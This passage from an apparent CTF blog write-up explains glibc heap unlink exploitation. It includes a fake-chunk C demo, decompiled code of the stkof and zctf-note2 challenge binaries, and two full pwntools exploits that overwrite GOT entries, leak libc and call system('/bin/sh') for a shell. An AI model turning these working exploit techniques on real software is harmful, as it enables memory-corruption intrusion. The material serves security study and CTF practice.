class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">struct chunk_structure &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct chunk_structure *fd;</span><br><span class="line">  struct chunk_structure *bk;</span><br><span class="line">  char buf[10];               // padding</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned long long *chunk1, *chunk2;</span><br><span class="line">struct chunk_structure *fake_chunk, *chunk2_hdr;</span><br><span class="line">char data[20];</span><br><span class="line"></span><br><span class="line">// First grab two chunks (non fast)</span><br><span class="line">chunk1 = malloc(0x80);        // Points to 0xa0e010</span><br><span class="line">chunk2 = malloc(0x80);        // Points to 0xa0e0a0</span><br><span class="line"></span><br><span class="line">// Assuming attacker has control over chunk1&apos;s contents</span><br><span class="line">// Overflow the heap, override chunk2&apos;s header</span><br><span class="line"></span><br><span class="line">// First forge a fake chunk starting at chunk1</span><br><span class="line">// Need to setup fd and bk pointers to pass the unlink security check</span><br><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br><span class="line">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == P</span><br><span class="line">fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P</span><br><span class="line"></span><br><span class="line">// Next modify the header of chunk2 to pass all security checks</span><br><span class="line">chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);</span><br><span class="line">chunk2_hdr-&gt;prev_size = 0x80;  // chunk1&apos;s data region size</span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~1;        // Unsetting prev_in_use bit</span><br><span class="line"></span><br><span class="line">// Now, when chunk2 is freed, attacker&apos;s fake chunk is &apos;unlinked&apos;</span><br><span class="line">// This results in chunk1 pointer pointing to chunk1 - 3</span><br><span class="line">// i.e. chunk1[3] now contains chunk1 itself.</span><br><span class="line">// We then make chunk1 point to some victim&apos;s data</span><br><span class="line">free(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[3] = (unsigned long long)data;</span><br><span class="line"></span><br><span class="line">strcpy(data, &quot;Victim&apos;s data&quot;);</span><br><span class="line"></span><br><span class="line">// Overwrite victim&apos;s data using chunk1</span><br><span class="line">chunk1[0] = 0x002164656b636168LL;   // hex for &quot;hacked!&quot;</span><br><span class="line"></span><br><span class="line">printf(&quot;%s\n&quot;, data);         // Prints &quot;hacked!&quot;</span><br></pre></td></tr></table></figure><h1 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>选项1：malloc_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 malloc_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; // [rsp+0h] [rbp-80h]</span><br><span class="line">  char *v2; // [rsp+8h] [rbp-78h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  v2 = (char *)malloc(size);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  ::s[++index] = v2;                            // ::全局</span><br><span class="line">  printf(&quot;%d\n&quot;, (unsigned int)index, size);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项二：edit_chunk           //完全没考虑之前malloc时的大小，直接溢出就对了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 edit_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  int i; // eax</span><br><span class="line">  unsigned int index; // [rsp+8h] [rbp-88h]</span><br><span class="line">  __int64 size; // [rsp+10h] [rbp-80h]</span><br><span class="line">  char *ptr; // [rsp+18h] [rbp-78h]</span><br><span class="line">  char s; // [rsp+20h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+88h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  index = atol(&amp;s);</span><br><span class="line">  if ( index &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !::s[index] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = ::s[index];</span><br><span class="line">  for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( size )</span><br><span class="line">    result = 0xFFFFFFFFLL;</span><br><span class="line">  else</span><br><span class="line">    result = 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项三：free_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  v1 = atol(&amp;s);</span><br><span class="line">  if ( v1 &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !::s[v1] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  free(::s[v1]);</span><br><span class="line">  ::s[v1] = 0LL;                                // free and make it be 0</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>基本上没什么分析的。。。漏洞很明显，就是在告诉你来unlink。</p><p>思路就是malloc几个smallbin大小的chunk，之后伪造fakechunk unlink，<br>之后edit被伪造的fakechunk的chunk，修改free，atoi的got表，调用system(“/bin/sh”)获得shell<br>1.利用unlink修改修改GOT表。<br>2.泄露libc基址。<br>3.将free_got改成system_addr.<br>4.free一个内存块，其中的内容是”/bin/sh”。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">if args[&apos;DEBUG&apos;]:</span><br><span class="line">    context.log_level = &apos;debug&apos;</span><br><span class="line">context.binary = &quot;./stkof&quot;</span><br><span class="line">stkof = ELF(&apos;./stkof&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    p = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./stkof&quot;)</span><br><span class="line">log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">head = 0x602140                              //ida可以直接看，全局分配在了bss段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def alloc(size):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    # trigger to malloc buffer for io function</span><br><span class="line">    alloc(0x100)  # idx 1</span><br><span class="line"></span><br><span class="line">    alloc(0x30)  # idx 2</span><br><span class="line">    # small chunk size inorder to trigger unlink</span><br><span class="line">    alloc(0x80)  # idx 3</span><br><span class="line">    # a fake chunk at global[2]=head+16 who&apos;s size is 0x20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602140</span><br><span class="line">0x602140:0x00000000000000000x000000000244d020</span><br><span class="line">0x602150:0x000000000244d5400x000000000244d580</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/100gx 0x000000000244d530</span><br><span class="line">0x244d530:0x00000000000000000x0000000000000041</span><br><span class="line">0x244d540:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d550:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d560:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d570:0x00000000000000000x0000000000000091</span><br><span class="line">0x244d580:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d590:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d600:0x00000000000000000x0000000000020a01</span><br><span class="line">0x244d610:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = p64(0)  #prev_size</span><br><span class="line">    payload += p64(0x20)  #size</span><br><span class="line">    payload += p64(head + 16 - 0x18)  #fd</span><br><span class="line">    payload += p64(head + 16 - 0x10)  #bk</span><br><span class="line">    payload += p64(0x20)  # next chunk&apos;s prev_size bypass the check</span><br><span class="line">    payload = payload.ljust(0x30, &apos;a&apos;)</span><br><span class="line">    # overwrite global[3]&apos;s chunk&apos;s prev_size</span><br><span class="line">    # make it believe that prev chunk is at global[2]</span><br><span class="line">    payload += p64(0x30)</span><br><span class="line">    # make it believe that prev chunk is free</span><br><span class="line">    payload += p64(0x90)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span><br><span class="line">    free(3)</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602140</span><br><span class="line">0x602140:0x00000000000000000x000000000244d020</span><br><span class="line">0x602150:0x00000000006021380x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span><br><span class="line">    payload = &apos;a&apos; * 8 + p64(stkof.got[&apos;free&apos;]) + p64(stkof.got[&apos;puts&apos;]) + p64(</span><br><span class="line">        stkof.got[&apos;atoi&apos;])</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    # edit free@got to puts@plt</span><br><span class="line">    payload = p64(stkof.plt[&apos;puts&apos;])</span><br><span class="line">    edit(0, len(payload), payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602130</span><br><span class="line">0x602130:0x00000000000000000x6161616161616161</span><br><span class="line">0x602140:0x0000000000602018  //free0x0000000000602020  //puts</span><br><span class="line">0x602150:0x0000000000602088  //atoi0x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #free global[1] to leak puts addr</span><br><span class="line">    free(1)</span><br><span class="line">    puts_addr = p.recvuntil(&apos;\nOK\n&apos;, drop=True).ljust(8, &apos;\x00&apos;)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(&apos;puts addr: &apos; + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">    system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">    log.success(&apos;libc base: &apos; + hex(libc_base))</span><br><span class="line">    log.success(&apos;/bin/sh addr: &apos; + hex(binsh_addr))</span><br><span class="line">    log.success(&apos;system addr: &apos; + hex(system_addr))</span><br><span class="line">    # modify atoi@got to system addr</span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h1 id="zctf-note2"><a href="#zctf-note2" class="headerlink" title="zctf-note2"></a>zctf-note2</h1><p>其实和stkof差不太多</p><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><ol><li>创建 //最多只能有三个note，同时note大小最大128</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int NewNote()</span><br><span class="line">&#123;</span><br><span class="line">  char *note; // ST08_8</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  unsigned int size; // [rsp+4h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)NoteNum &gt; 3 )</span><br><span class="line">    return puts(&quot;note lists are full&quot;);</span><br><span class="line">  puts(&quot;Input the length of the note content:(less than 128)&quot;);</span><br><span class="line">  size = inputNum();</span><br><span class="line">  if ( size &gt; 0x80 )</span><br><span class="line">    return puts(&quot;Too long&quot;);</span><br><span class="line">  note = (char *)malloc(size);</span><br><span class="line">  puts(&quot;Input the note content:&quot;);</span><br><span class="line">  ReadStr(note, size, 10);</span><br><span class="line">  RemovePercent(note);</span><br><span class="line">  ptr[NoteNum] = (__int64)note;</span><br><span class="line">  Len[NoteNum] = size;</span><br><span class="line">  v2 = NoteNum++;</span><br><span class="line">  return printf(&quot;note add success, the id is %d\n&quot;, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>修改  //两种方式，overwrite与append</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;);</span><br><span class="line">        v4 = inputNum();</span><br><span class="line">        if ( v4 == 1 || v4 == 2 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( v4 == 1 )</span><br><span class="line">            dest = 0;</span><br><span class="line">          else</span><br><span class="line">            strcpy(&amp;dest, src);</span><br><span class="line">          v0 = (char *)malloc(0xA0uLL);</span><br><span class="line">          v8 = v0;</span><br><span class="line">          *(_QWORD *)v0 = &apos;oCweNehT&apos;;</span><br><span class="line">          *((_QWORD *)v0 + 1) = &apos;:stnetn&apos;;</span><br><span class="line">          printf(v8);</span><br><span class="line">          ReadStr(v8 + 15, 0x90LL, 10);</span><br><span class="line">          RemovePercent(v8 + 15);</span><br><span class="line">          v1 = v8;</span><br><span class="line">          v1[v6 - strlen(&amp;dest) + 14] = 0;</span><br><span class="line">          strncat(&amp;dest, v8 + 15, 0xFFFFFFFFFFFFFFFFLL);</span><br><span class="line">          strcpy(src, &amp;dest);</span><br><span class="line">          free(v8);</span><br><span class="line">          puts(&quot;Edit note success!&quot;);</span><br></pre></td></tr></table></figure><p>还有show的功能和delete的功能，这里就不展示了</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>相比于stkof显而易见的漏洞，这个因为edit的操作较为复杂，漏洞没有那么容易出来，但是如果出来便可以直接利用。<br>在malloc时，可以输入size为0，这样将自动分配最小单位即0x20大小的chunk，但是在readstr时允许输入size-1大小的数，也就是0xffffffff，这样便足以溢出去修改。<br>free之后再申请同样大小的chunk，便会将其列入第四个chunk但是位置仍然在之前chunk1的位置，通过之前size的漏洞修改chunk3的pre_size及size得到unlink的条件。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./note2&apos;)</span><br><span class="line">note2 = ELF(&apos;./note2&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def newnote(length, content):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;(less than 128)&apos;)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.recvuntil(&apos;content:&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shownote(id):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def editnote(id, choice, s):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line">    sh.recvuntil(&apos;2.append]&apos;)</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line">    sh.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def deletenote(id):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">sh.sendline(&apos;siriuswhiter&apos;)</span><br><span class="line">sh.recvuntil(&apos;address:&apos;)</span><br><span class="line">sh.sendline(&apos;aaaaaaaaaaaaaaaaa&apos;)</span><br><span class="line"></span><br><span class="line"># chunk0: a fake chunk</span><br><span class="line">ptr = 0x0000000000602120</span><br><span class="line">fakefd = ptr - 0x18</span><br><span class="line">fakebk = ptr - 0x10</span><br><span class="line">content = &apos;a&apos; * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + &apos;b&apos; * 64 + p64(0x60)</span><br><span class="line">#content = p64(fakefd) + p64(fakebk)</span><br><span class="line">newnote(128, content)</span><br><span class="line"># chunk1: a zero size chunk produce overwrite</span><br><span class="line">newnote(0, &apos;a&apos; * 8)</span><br><span class="line"># chunk2: a chunk to be overwrited and freed</span><br><span class="line">newnote(0x80, &apos;b&apos; * 16)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># edit the chunk1 to overwrite the chunk2</span><br><span class="line">deletenote(1)</span><br><span class="line">content = &apos;a&apos; * 16 + p64(0xa0) + p64(0x90)</span><br><span class="line">newnote(0, content)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"># delete note 2 to trigger the unlink</span><br><span class="line"># after unlink, ptr[0] = ptr - 0x18</span><br><span class="line">deletenote(2)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># overwrite the chunk0(which is ptr[0]) with got atoi</span><br><span class="line">atoi_got = note2.got[&apos;atoi&apos;]</span><br><span class="line">content = &apos;a&apos; * 0x18 + p64(atoi_got)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line"># get the aoti addr</span><br><span class="line">shownote(0)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;is &apos;)</span><br><span class="line">atoi_addr = sh.recvuntil(&apos;\n&apos;, drop=True)</span><br><span class="line">print atoi_addr</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(8, &apos;\x00&apos;))</span><br><span class="line">print &apos;leak atoi addr: &apos; + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"># get system addr</span><br><span class="line">atoi_offest = libc.symbols[&apos;atoi&apos;]</span><br><span class="line">libcbase = atoi_addr - atoi_offest</span><br><span class="line">system_offest = libc.symbols[&apos;system&apos;]</span><br><span class="line">system_addr = libcbase + system_offest</span><br><span class="line"></span><br><span class="line">print &apos;leak system addr: &apos;, hex(system_addr)</span><br><span class="line"></span><br><span class="line"># overwrite the atoi got with systemaddr</span><br><span class="line">content = p64(system_addr)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># get shell</span><br><span class="line">sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前看了好久的unlink，现在回来再看一下，顺便写个笔记&lt;/p&gt;
&lt;h1 id=&quot;unlink-原理&quot;&gt;&lt;a href=&quot;#unlink-原理&quot; class=&quot;headerlink&quot; title=&quot;unlink 原理&quot;&gt;&lt;/a&gt;unlink 原理&lt;/h1&gt;&lt;p&gt;  当创建
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
